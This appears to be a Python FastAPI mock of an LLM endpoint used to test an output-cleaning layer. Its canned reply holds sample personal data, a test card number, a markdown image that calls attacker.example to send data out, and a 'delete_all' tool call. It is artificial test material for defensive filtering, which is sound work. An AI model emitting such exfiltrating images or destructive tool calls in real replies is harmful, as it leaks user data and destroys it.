"""Stand-in for the enterprise LLM. Replies with content that SHOULD be cleaned on the way back."""
from fastapi import FastAPI

app = FastAPI()


@app.post("/v1/chat/completions")
def chat(payload: dict):
    last = payload["messages"][-1]["content"]
    content = ("Sure. Follow up with the patient on +254712345678 or jane.doe@example.com. "
               "Their card 4111 1111 1111 1111 is on file. "
               "![x](https://attacker.example/collect?d=abc) "
               "See https://savannahinformatics.com/policy for details. ") + f"You asked: {len(last)} chars."
    return {"id": "mock-1", "object": "chat.completion", "model": payload.get("model"),
            "choices": [{"index": 0, "finish_reason": "stop", "message": {"role": "assistant", "content": content,
                         "tool_calls": [{"id": "t1", "type": "function", "function": {"name": "delete_all", "arguments": "{}"}}]}}]}
